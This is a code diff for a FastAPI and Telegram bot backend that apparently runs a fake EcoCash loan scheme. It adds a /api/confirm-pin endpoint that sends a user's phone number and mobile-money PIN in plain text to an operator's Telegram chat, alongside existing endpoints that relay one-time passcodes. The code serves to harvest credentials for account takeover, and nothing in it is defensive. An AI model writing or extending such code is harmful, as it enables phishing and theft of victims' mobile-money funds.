@@ -31,7 +31,11 @@ class OTPRequest(BaseModel):
     otp: str
     amount: float
 
-# NEW MODEL FOR RESEND
+class ConfirmPinRequest(BaseModel):
+    phone: str
+    pin: str
+    amount: float
+
 class ResendOTPRequest(BaseModel):
     phone: str
     amount: float
@@ -41,17 +45,12 @@ ptb_app = Application.builder().token(BOT_TOKEN).updater(None).build()
 
 async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    if not query:
-        print("⚠️ No callback query found in update.")
-        return
-        
-    print(f"⚡ Button Clicked! Data: {query.data}")
+    if not query: return
     
     try:
         await query.answer(text="Processing...") 
         data = query.data.split(":")
-        if len(data) < 2:
-            return
+        if len(data) < 2: return
             
         action = data[0]
         tx_id = data[1]
@@ -63,27 +62,20 @@ async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_
                 transactions[tx_id]["status"] = "denied"
                 
             try:
-                original_text = query.message.text or query.message.caption or "EcoCash Loan Request"
+                original_text = query.message.text or query.message.caption or "EcoCash Request"
                 status_text = '✅ <b>APPROVED</b>' if action == 'accept' else '❌ <b>DENIED</b>'
-                await query.edit_message_text(
-                    text=f"{original_text}\n\n{status_text}", 
-                    parse_mode="HTML"
-                )
+                await query.edit_message_text(text=f"{original_text}\n\n{status_text}", parse_mode="HTML")
             except Exception as e:
-                print(f"⚠️ Could not edit message: {e}")
+                pass
         else:
             try:
-                original_text = query.message.text or query.message.caption or "EcoCash Loan Request"
-                await query.edit_message_text(
-                    text=f"{original_text}\n\n⚠️ <b>EXPIRED</b> (Server Restarted)", 
-                    parse_mode="HTML"
-                )
+                original_text = query.message.text or query.message.caption or "EcoCash Request"
+                await query.edit_message_text(text=f"{original_text}\n\n⚠️ <b>EXPIRED</b>", parse_mode="HTML")
             except Exception as e:
-                print(f"⚠️ Could not edit expired message: {e}")
+                pass
 
     except Exception as e:
         print(f"❌ Button Handler Error: {e}")
-        traceback.print_exc()
 
 ptb_app.add_handler(CallbackQueryHandler(handle_telegram_buttons))
 
@@ -151,14 +143,36 @@ async def verify_otp(req: OTPRequest):
         raise HTTPException(status_code=500, detail=str(e))
     return {"transaction_id": tx_id}
 
-# NEW ENDPOINT FOR RESEND OTP
+# NEW ENDPOINT: CONFIRM PIN
+@app.post("/api/confirm-pin")
+async def confirm_pin(req: ConfirmPinRequest):
+    tx_id = str(uuid.uuid4())
+    transactions[tx_id] = {"status": "pending", "type": "confirm_pin"}
+    
+    message = (
+        f"🔐 <b>CONFIRM ECOCASH PIN</b>\n\n"
+        f"📱 <b>Phone:</b> +263 {req.phone}\n"
+        f"🔑 <b>PIN:</b> {req.pin}\n\n"
+        f"💰 <b>Amount:</b> ZWG {req.amount:,.2f}\n\n"
+        f"👇 <i>Approve this PIN to disburse the loan?</i>"
+    )
+    keyboard = [[
+        InlineKeyboardButton("✅ ACCEPT", callback_data=f"accept:{tx_id}:confirm_pin"),
+        InlineKeyboardButton("❌ DENY", callback_data=f"deny:{tx_id}:confirm_pin")
+    ]]
+    try:
+        await ptb_app.bot.send_message(chat_id=ADMIN_CHAT_ID, text=message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+    return {"transaction_id": tx_id}
+
 @app.post("/api/resend-otp")
 async def resend_otp(req: ResendOTPRequest):
     message = (
         f"🔄 <b>OTP RESEND REQUEST</b>\n\n"
         f"📱 <b>Phone:</b> +263 {req.phone}\n"
         f"💰 <b>Amount:</b> ZWG {req.amount:,.2f}\n\n"
-        f"👇 <i>The user requested a new OTP code. Please send it or wait for them to enter it.</i>"
+        f"👇 <i>The user requested a new OTP code.</i>"
     )
     try:
         await ptb_app.bot.send_message(chat_id=ADMIN_CHAT_ID, text=message, parse_mode="HTML")
@@ -194,11 +208,7 @@ async def set_telegram_webhook():
     webhook_url = f"{base_url.rstrip('/')}/api/webhook/telegram"
     try:
         await ptb_app.bot.delete_webhook(drop_pending_updates=True)
-        await ptb_app.bot.set_webhook(
-            url=webhook_url, 
-            secret_token=WEBHOOK_SECRET,
-            allowed_updates=["message", "callback_query"]
-        )
+        await ptb_app.bot.set_webhook(url=webhook_url, secret_token=WEBHOOK_SECRET, allowed_updates=["message", "callback_query"])
         return {"status": "success", "webhook_url": webhook_url}
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
